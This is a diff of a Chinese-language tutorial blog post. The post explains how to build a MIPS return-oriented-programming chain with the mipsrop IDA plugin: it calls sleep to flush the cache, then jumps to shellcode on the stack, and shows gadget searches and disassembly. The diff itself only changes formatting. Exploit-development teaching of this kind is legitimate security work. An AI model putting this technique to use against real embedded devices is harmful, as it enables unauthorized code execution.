@@ -116,7 +116,7 @@ p.interactive()
 找 gadget 我们可以使用 mipsrop.py 这个 ida 插件进行。
 
 由于 mips 流水指令集的特点，存在 cache incoherency 的特性，需要调用 sleep 或者其他函数将数据区刷新到当前指令区中去，才能正常执行 shellcode。为了找到更多的 gadget，以及这是一个 demo ，所有我们在 libc 里查找
-* 1. 调用 sleep 函数
+### 1. 调用 sleep 函数
   调用 sleep 函数之前，我们需要先找到对 a0 进行设置的 gadget
 ```
 Python>mipsrop.find("li $a0, 1")
@@ -183,17 +183,10 @@ Python>mipsrop.tail()
 ----------------------------------------------------------------------------------------------------------------
 Found 20 matching gadgets
 ```
-
-
-
 如果没有合适的，我们可以尝试找在一些 "*dir" 的函数结尾来查找，有没有合适的，例如我在 readdir64 函数的末尾发现如下 gadget
-
 ![image-20201029161619764](https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20201029161619764.png)
-
 这样我们就能控制 s2 寄存器也能控制 PC，下一步就是跳到 sleep, 但是单纯的跳到 sleep 是不够的，同时我们要保证执行完 sleep 后能跳到下一个 gadget ，所以我们还需要一个既能 执行 sleep 又能控制下一个 PC 地址的 gadget
-
 看了眼寄存器，此时 我们还能控制的还挺多，例如我这里找 $a3 的寄存器
-
 ```
 Python>mipsrop.find("mov $t9, $s3")
 ----------------------------------------------------------------------------------------------------------------
@@ -204,9 +197,7 @@ Python>mipsrop.find("mov $t9, $s3")
 |  0x000949EC  |  move $t9,$s3                                        |  jalr  $s3                             |
 ....
 ```
-
 例如
-
 ```
 .text:000949EC                 move    $t9, $s3
 .text:000949F0                 jalr    $t9 ; uselocale
@@ -222,10 +213,8 @@ Python>mipsrop.find("mov $t9, $s3")
 .text:00094A10                 jr      $ra
 .text:00094A14                 addiu   $sp, 0x38
 ```
-
 通过这个 gadget 我们先跳到 s3 的寄存器执行 sleep ，再通过控制的 ra 寄存器进行下一步操作
-
-* 2. jmp shellcode
+### 2. jmp shellcode
 
   下一步就是跳到 shellcode ，要跳到shellcode 我们先需要获得栈地址
 
@@ -241,9 +230,7 @@ Python>mipsrop.find("mov $t9, $s3")
   .text:00095B84                 move    $t9, $s5
   .text:00095B88                 jalr    $t9
   ```
-
   该 gadget 可以将栈地址， 即 $sp+24 的值赋值给 $a0 ，那么这个栈就是我们即将填充 shellcode 的地方， $s5 可控，最后这段 gadget 会跳往 $s5 , 那么我们只需要再找一个直接 jr $a0 的gadget 即可
-
   ```
   Python>mipsrop.find("move $t9, $a1")
   ----------------------------------------------------------------------------------------------------------------
